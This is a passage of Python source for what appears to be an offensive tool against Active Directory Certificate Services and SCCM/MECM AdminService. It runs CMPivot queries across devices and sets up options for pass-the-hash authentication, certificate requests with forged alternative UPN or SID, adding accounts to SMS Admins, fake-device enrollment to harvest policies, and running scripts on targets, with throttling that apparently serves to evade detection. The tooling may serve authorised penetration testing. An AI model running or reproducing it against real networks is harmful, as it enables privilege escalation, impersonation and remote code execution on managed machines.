		print(f"[+] CMPivot executed with Operation ID = {opid}. Sleeping 10 seconds to wait for client(s) to callback")
		time.sleep(10)

		print(f"[+] Requesting CMPivot output")

		endpoint = f"{target}/AdminService/v1.0/{runType}({runTarget})/AdminService.CMPivotResult(OperationId=({opid}))"
		while True:
			try:
				res = session.get(endpoint, verify = False, proxies = proxies)
				if res.status_code == 404:
					time.sleep(10)
					continue

				data = res.json()
				if isinstance(data['value'], list):
					for entry in data['value']:
						tb = dp.DataFrame(entry['Result'])
						result = tabulate(tb, showindex = False, headers = tb.columns, tablefmt = 'grid')
						if result == '':
							print("\t[+] No output or member of the collection not available")
						else:
							print(result)
				else:
					tb = dp.DataFrame(data['value']['Result'])
					result = tabulate(tb, showindex = False, headers = tb.columns, tablefmt = 'grid')
					if result == '':
						print("\t[+] No output or device not available")
					else:
						print(result)
				break
			except Exception as e:
				print("\t[-] Failed to get script output", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##################################################
#                     MAIN                       #
##################################################

def print_red(text):
	print("\033[91m" + text + "\033[0m")

def print_yellow(text):
	print("\033[93m" + text + "\033[0m")

def parseTarget(target):
	import ipaddress, re

	cidrRegex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$|^(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}/[0-9]{1,3}$"
	isFile = False
	isMultipleIPs = False

	res = []

	tmp = []
	try:
		with open(target, "r") as f:
			tmp = [line.rstrip('\n') for line in f.readlines()]
			isFile = True
	except:
		pass

	if not isFile:
		if target.find(",") != -1:
			tmp = target.split(",")
			isMultipleIPs = True

	if not isFile and not isMultipleIPs:
		tmp = [target]

	for entry in tmp:
		if re.match(cidrRegex, entry):
			network = ipaddress.ip_network(entry, strict = False)
			for ip in network:
				res.append(str(ip))
		else:
			res.append(entry)

	return res

def maybeSleep(deep = True, inAction = False):
	global THROTTLE, THROTTLE_DEEP
	if deep:
		if THROTTLE_DEEP != None:
			print("\n--- SLEEPING ---\n")
			time.sleep(THROTTLE_DEEP)
	else:
		if THROTTLE != None and THROTTLE_DEEP == None:
			print("--- SLEEPING ---\n")
			time.sleep(THROTTLE)
	if inAction and THROTTLE_DEEP == None:
		print()

def add_arguments(parser):
	auth_group = parser.add_argument_group('[[ Authentication ]]')
	auth_group.add_argument("--channelBinding", help = "Use Channel Binding for HTTPS. Default = False", action = "store_true")
	auth_group.add_argument("--proxy", help = "HTTP Burp proxy in the form of <Protocol>://<TargetProxy>:<TargetPort>. Not compatible with Channel Binding")
	auth_group.add_argument("--upstreamProxy", help = 'HTTP upstream proxy to receive Burp connections in the form of <TargetProxy>:<TargetPort>. Default = "localhost:1235"', default = "localhost:1235")

	request_group = parser.add_argument_group('[[ Request ]]')
	request_group.add_argument("--doRequest", help = 'Do HTTP request to the provided path')
	request_group.add_argument("--method", help = 'HTTP method. Default = GET', default = 'GET')
	request_group.add_argument("--headers", help = 'Commas separated list of custom HTTP headers to include/replace with <Key1>=<Value1>,[...],<KeyN>=<ValueN>')
	request_group.add_argument("--cookies", help = 'Commas separated list of HTTP cookies to include with <Key1>=<Value1>,[...],<KeyN>=<ValueN>')
	request_group.add_argument("--params", help = 'Commas separated list of HTTP cookies to include with <Key1>=<Value1>,[...],<KeyN>=<ValueN>')
	request_group.add_argument("--jsonBody", help = 'HTTP body as JSON string for application/json')
	request_group.add_argument("--body", help = 'HTTP body <Key1>=<Value1>&[...]&<KeyN>=<ValueN> for application/x-www-form-urlencoded or as string XML for application/xml')
	request_group.add_argument("--fileKey", help = "HTTP form value of key 'name' for multipart/form-data")
	request_group.add_argument("--fileName", help = "HTTP form value of key 'filename' for multipart/form-data")
	request_group.add_argument("--filePath", help = "Local path of file to upload for multipart/form-data")

	adcs_group = parser.add_argument_group('[[ ADCS ]]')	
	adcs_group.add_argument("--requestTemplate", help = "ADCS certificate template name to request")
	adcs_group.add_argument("--CAName", help = "ADCS Certification Authority name to send request")
	adcs_group.add_argument("--outFile", help = "Output file name for the PFX certificate (No password will be set)")
	adcs_group.add_argument("--renew", help = "Use renewal request. Default = False", action = "store_true")
	adcs_group.add_argument("--onBehalfOf", help = "On behalf user to request (<DomainNotFQDN>\<User>) from a Certificate Request Agent certificate. Default = Current user")
	adcs_group.add_argument("--pfxFile", help = "PFX file for renewal/on-behalf-of request")
	adcs_group.add_argument("--pfxPwd", help = "PFX password for renewal/on-behalf-of request (if set from certificate)")
	adcs_group.add_argument("--subject", help = "Distinguished name of subject to include into certificate. Default = CN=<CurrentUser>")
	adcs_group.add_argument("--altDNS", help = "Alternative DNS to include into SAN")
	adcs_group.add_argument("--altUPN", help = "Alternative UPN in the form of <User>@<Domain> to include into SAN")
	adcs_group.add_argument("--altSID", help = "Alternative Object SID to include into SAN")
	adcs_group.add_argument("--archiveKey", help = "Send RSA private key generated through Certificate Signing Request (CSR) to Key Archival. Default = False", action = "store_true")
	adcs_group.add_argument("--keySize", help = "Length of RSA private key to generate through Certificate Signing Request (CSR). Default = 2048", default = 2048)
	adcs_group.add_argument("--applicationPolicies", help = "Application Policies to include through Certificate Signing Request (CSR). Work only for templates with Template Schema Version = 1 and Enrollee Supplies Subject = True. Commas separated list. Example: Client Authentication,Certificate Request Agent")

	sccm_group = parser.add_argument_group('[[ SCCM / MECM AdminService API ]]')
	sccm_group.add_argument("--enumSCCM", help = "Enumerate SCCM infos", action = "store_true")
	sccm_group.add_argument("--searchDevice", help = "Search SCCM Device with provided name")
	sccm_group.add_argument("--searchLastLogonUser", help = "Search last logon of user on SCCM Devices")
	sccm_group.add_argument("--searchUser", help = "Search SCCM User with provided name")
	sccm_group.add_argument("--searchPrimaryUser", help = "Search SCCM Primary User with provided name")
	sccm_group.add_argument("--searchCollection", help = "Search SCCM Collection with provided name")
	sccm_group.add_argument("--searchCollectionMembers", help = "Search members of provided SCCM Collection ID")
	sccm_group.add_argument("--listSMSAdmins", help = "List SMS Admins of SCCM", action = "store_true")
	sccm_group.add_argument("--listRBAC", help = "List users RBAC of SCCM", action = "store_true")
	sccm_group.add_argument("--listConsoleConnections", help = "List console connections on SCCM clients", action = "store_true")
	sccm_group.add_argument("--addSMSAdmin", help = "Add <sAMAccountName>:<SID> to SMS Admins of SCCM")
	sccm_group.add_argument("--removeSMSAdmin", help = "Remove provided <sAMAccountName> from SMS Admins of SCCM")
	sccm_group.add_argument("--policiesSCCM", help = "Request SCCM Policies after enrolling new fake device. Device will be deletable with SCCM elevated rights only", action = "store_true")
	sccm_group.add_argument("--saveCertificate", help = "Save created PEM certificate for fake device", action = "store_true")
	sccm_group.add_argument("--devicePrivKey", help = "Do not enroll new fake device: Use the provided enrolled device with PEM private key. Device GUID required")
	sccm_group.add_argument("--deviceGUID", help = "Do not enroll new fake device: Use the provided enrolled device with GUID. Device PEM private key required")
	sccm_group.add_argument("--unauthRegistration", help = "Enroll fake device through unauthenticated CCM endpoint. Default = False", action = "store_true")
	sccm_group.add_argument("--sleepTime", help = "Seconds to wait for database update after fake device enrollment. Default = 180", type = int, default = 180)
	sccm_group.add_argument("--scriptSCCM", help = "Create, approve, run and delete SCCM script with <ScriptPath>:<TargetDeviceResouceID>")
	sccm_group.add_argument("--runScript", help = "Run and delete SCCM script with <ScriptGUID>:<TargetDeviceResouceID>")
	sccm_group.add_argument("--approveScript", help = "Approve SCCM script with provided GUID")
	sccm_group.add_argument("--deleteScript", help = "Delete SCCM script with provided GUID")
	sccm_group.add_argument("--CMPivotSCCM", help = '''Run CMPivot from <CMD>:<TargetType>:<Target> with
	<CMD>
		"Administrators"                             List local administrators
		"User"                                       List currently logged users
		"User | where UserName contains '<User>'"    Check if <User> is currently logged
		"OS"                                         Get OS information
		"File('<RemoteFilePath>')"                   Get information on <RemoteFilePath>
		"FileShare"                                  List shares
		"InstalledExecutable"                        List installed executables
		"InstalledSoftware"                          List installed softwares
		"IPConfig"                                   Get IP configuration
		"LogicalDisk"                                List logical disks
		"Process"                                    List processes
		"Services"                                   List services
		"SystemConsoleUser"                          Get info on users with console logons
		"Environment"                                Get environment variables
		"Disk"                                       List disks
	<TargetType>
		"Device"           Run CMPivot on a specific device
		"Collections"      Run CMPivot on all devices from a specific collection
	<Target>
		<ResourceID>       Device ResourceID
		<CollectionID>     Collection CollectionID''')

THROTTLE = None
THROTTLE_DEEP = None
def handle_arguments(args):
	targets = ['LOCAL']
	if args.target != None:
		targets = parseTarget(args.target)
	if args.shuffle:
		random.shuffle(targets)
	if args.throttle != None:
		global THROTTLE
		THROTTLE = args.throttle
	if args.throttleDeep != None:
		global THROTTLE_DEEP
		THROTTLE_DEEP = args.throttleDeep

	firstTarget = True

	for target in targets:
		if not firstTarget:
			maybeSleep(deep = False)
		else:
			firstTarget = False

		print_red("|---------------------------")
		print_red(f"| {target}")
		print_red("|---------------------------")
		print()

		session = getSession(target, args.proxy, args.upstreamProxy, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
		maybeSleep(inAction = True)

		# Request
		if args.doRequest:
			doRequest(session, target, args.proxy, args.method, args.doRequest, args.headers, args.cookies, args.params, args.jsonBody, args.body, args.fileKey, args.fileName, args.filePath)
			maybeSleep(inAction = True)
		
		# ADCS
		if args.requestTemplate != None:
			requestCertificate(session, target, args.proxy, args.username, args.requestTemplate, args.CAName, args.outFile, args.renew, args.onBehalfOf, args.pfxFile, args.pfxPwd, args.subject, args.altDNS, args.altUPN, args.altSID, args.archiveKey, args.keySize, args.applicationPolicies)
			maybeSleep(inAction = True)
		
		# SCCM / MECM AdminService API
		if args.enumSCCM:
			enumSCCM(session, target, args.proxy)
			maybeSleep(inAction = True)
		if args.searchDevice != None:
			getDevice(session, target, args.proxy, args.searchDevice)
			maybeSleep(inAction = True)
		if args.searchLastLogonUser != None:
			getLastLogonUser(session, target, args.proxy, args.searchLastLogonUser )
			maybeSleep(inAction = True)
		if args.searchUser != None:
			getUser(session, target, args.proxy, args.searchUser)
			maybeSleep(inAction = True)
		if args.searchPrimaryUser != None:
			getPrimaryUser(session, target, args.proxy, args.searchPrimaryUser)
			maybeSleep(inAction = True)
		if args.searchCollection != None:
			getCollection(session, target, args.proxy, args.searchCollection)
			maybeSleep(inAction = True)
		if args.searchCollectionMembers != None:
			getCollectionMembers(session, target, args.proxy, args.searchCollectionMembers)
			maybeSleep(inAction = True)
		if args.listSMSAdmins:
			getAdmins(session, target, args.proxy)
			maybeSleep(inAction = True)
		if args.listRBAC:
			getRBAC(session, target, args.proxy)
			maybeSleep(inAction = True)
		if args.listConsoleConnections:
			getConsoleConnections(session, target, args.proxy)
			maybeSleep(inAction = True)
		if args.addSMSAdmin != None:
			addAdmin(session, target, args.proxy, *args.addSMSAdmin.split(':'))
			maybeSleep(inAction = True)
		if args.removeSMSAdmin != None:
			deleteAdmin(session, target, args.proxy, args.removeSMSAdmin)
			maybeSleep(inAction = True)
		if args.policiesSCCM:
			requestPolicies(session, target, args.proxy, args.domain, args.unauthRegistration, args.devicePrivKey, args.deviceGUID, args.sleepTime, args.saveCertificate)
			maybeSleep(inAction = True)
		if args.scriptSCCM != None:
			doScript(session, target, args.proxy, *args.scriptSCCM.split(':'))
			maybeSleep(inAction = True)
		if args.runScript != None:
			runScript(session, target, args.proxy, *args.runScript.split(':'))
			maybeSleep(inAction = True)
		if args.approveScript != None:
			approveScript(session, target, args.proxy, args.approveScript)
			maybeSleep(inAction = True)
		if args.deleteScript != None:
			deleteScript(session, target, args.proxy, args.deleteScript)
			maybeSleep(inAction = True)
		if args.CMPivotSCCM != None:
			doCMPivot(session, target, args.proxy, *args.CMPivotSCCM.split(':'))
			maybeSleep(inAction = True)

		if args.proxy: # Cleaning when using proxy
			global SRV_SOCKET, STOP_EVENT
			STOP_EVENT = True
			try:
				os.remove("server.key")
				os.remove("server.crt")
			except:
				pass
			try:
				SRV_SOCKET.close()
			except:
				pass

##################################################
#                     TODO                       #
##################################################